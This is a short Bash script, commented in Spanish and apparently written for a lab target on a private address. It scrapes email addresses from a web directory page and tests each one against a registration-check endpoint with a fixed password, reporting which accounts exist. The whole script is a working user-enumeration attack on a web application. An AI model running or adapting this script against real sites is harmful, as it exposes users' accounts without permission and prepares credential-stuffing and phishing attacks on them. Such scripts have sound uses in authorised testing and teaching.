#/usr/bin/env bash
VERDE='\e[32m'
ROJO='\e[31m'
RESET='\e[0m'
#recupera en la variable corpusers los email de una pagina de la web llamada directorio.
#Transforma  la respuesta en un listado de correos
corpusers=$(curl -s http://192.168.56.200:8080/directorio | sed 's/<[^>]*>/\n/g' | grep @)

# iteramos los correos
for email in $corpusers;
do
  #probamos cada correo contra el endpoint de registro con contraseña inventada.
  #almacenamos la respuesta en res y en funcion de la misma pintamos salida en verde y rojo.
  res=$(curl -s -d "mail=$email&p1=Pass123&p2=Pass123" http://192.168.56.200:8080/reg_check)
  if [[ $res =~ "alta" ]] ;
        then
          echo -e "${VERDE}[-] Usuario dado de alta: ${email}${RESET}"
        else
          echo -e "${ROJO}[+] Usuario sin registrar: ${email}${RESET}"
  fi
done
